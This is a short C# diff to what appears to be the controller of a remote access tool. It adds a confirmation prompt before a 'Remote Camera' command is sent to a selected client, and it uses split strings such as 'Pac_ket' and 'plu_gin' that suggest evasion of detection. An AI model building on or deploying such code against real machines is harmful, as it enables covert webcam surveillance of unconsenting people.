@@ -720,9 +720,10 @@ namespace Server
 
         private void RemoteCameraToolStripMenuItem_Click(object sender, EventArgs e)
         {
+            DialogResult dialogResult = MessageBox.Show("Open the camera ?", "Remote Camera", MessageBoxButtons.YesNo);
             try
             {
-                if (listView1.SelectedItems.Count > 0)
+                if (listView1.SelectedItems.Count > 0 && dialogResult == DialogResult.Yes)
                 {
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
